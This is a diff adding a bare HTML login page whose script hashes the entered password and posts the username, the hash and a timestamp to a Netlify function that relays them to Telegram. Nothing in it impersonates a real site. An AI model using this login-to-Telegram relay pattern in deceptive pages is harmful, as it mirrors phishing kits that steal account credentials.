@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login → Send to Telegram</title>
+</head>
+<body>
+  <h2>Login Form</h2>
+  <form id="loginForm">
+    <label>
+      Username: <input name="username" required />
+    </label>
+    <br/>
+    <label>
+      Password: <input name="password" type="password" required />
+    </label>
+    <br/>
+    <button type="submit">Submit</button>
+  </form>
+
+  <div id="status"></div>
+
+  <script>
+    async function sha256Hex(str) {
+      const enc = new TextEncoder();
+      const data = enc.encode(str);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const form = e.target;
+      const username = form.username.value.trim();
+      const password = form.password.value;
+
+      const hashedPassword = await sha256Hex(password);
+
+      const payload = {
+        username,
+        password_hash: hashedPassword,
+        time: new Date().toISOString()
+      };
+
+      const status = document.getElementById('status');
+      status.textContent = 'Sending...';
+
+      try {
+        const res = await fetch('/.netlify/functions/sendTelegram', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (res.ok) {
+          status.textContent = 'Message sent to Telegram ✔';
+        } else {
+          status.textContent = 'Error: ' + (data.error || res.statusText);
+        }
+      } catch (err) {
+        status.textContent = 'Fetch error: ' + err.message;
+      }
+    });
+  </script>
+</body>
+</html>
